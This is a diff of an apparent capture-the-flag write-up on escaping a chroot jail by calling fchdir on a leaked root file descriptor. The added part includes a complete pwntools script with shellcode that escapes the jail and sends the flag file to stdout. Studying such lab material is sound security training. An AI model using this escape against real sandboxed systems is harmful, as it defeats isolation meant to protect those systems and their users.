@@ -58,7 +58,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
@@ -81,36 +81,62 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Chroot Escape via fchdir
-
-== Introduction
-
-This challenge allows `fchdir` in its seccomp filter, which provides a direct way to escape the `chroot` environment if we have an FD to a directory outside.
-
 == Vulnerability Analysis
 
-The process opens `/` before calling `chroot` and `chdir("/")`. This FD points to the host's root directory. The `fchdir` syscall changes the CWD to the directory referred to by an FD, even if that directory is outside the current root.
+The challenge allows the `fchdir` system call, which is a powerful primitive for escaping jails when combined with a leaked file descriptor.
 
-== Exploitation Steps
-
-=== 1. Escaping the Jail
-Call `fchdir` on the leaked root FD (usually 3).
-
-```nasm
-/* fchdir(3) */
-mov rdi, 3
-mov rax, 81 /* SYS_fchdir */
-syscall
+```c
+assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
 ```
 
-=== 2. Reading the Flag
-Once the CWD is outside the jail, we can `open("flag", ...)` directly.
+The `fchdir` syscall changes the process's current working directory to the directory referenced by a file descriptor. If we possess a file descriptor pointing to a directory *outside* the jail (e.g., the host's root), calling `fchdir` on it will move our CWD out of the jail.
 
-```nasm
-/* open("flag", O_RDONLY) */
-lea rdi, [rip + flag_str]
-mov rsi, 0
-mov rax, 2 /* SYS_open */
-syscall
+== Exploitation Plan
 
+1.  **Leak Root FD:** Execute the binary with `/` as the argument to obtain a file descriptor (FD 3) pointing to the host's root directory.
+2.  **Escape Jail:** Use the `fchdir` syscall with the leaked FD (3). This sets our current working directory to the host's root.
+3.  **Read Flag:** Now that our CWD is the host's root, we can simply `open("flag")` (relative to CWD) to access the real flag.
+
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+# Pass '/' to leak the root FD
+p = process([exe, "/"])
+
+shellcode = asm("""
+    /* fchdir(3) */
+    mov rdi, 3          /* fd: 3 (leaked root) */
+    mov rax, 81         /* syscall: SYS_fchdir */
+    syscall
+
+    /* open("flag", O_RDONLY) */
+    lea rdi, [rip + flag_str]
+    xor rsi, rsi
+    mov rax, 2          /* syscall: SYS_open */
+    syscall
+
+    /* sendfile(1, fd, 0, 100) */
+    mov rsi, rax        /* in_fd */
+    mov rdi, 1          /* out_fd */
+    xor rdx, rdx        /* offset */
+    mov r10, 100        /* count */
+    mov rax, 40         /* syscall: SYS_sendfile */
+    syscall
+
+    /* exit(0) */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+flag_str:
+    .string "flag"
+""")
+
+p.send(shellcode)
+p.interactive()
 ```
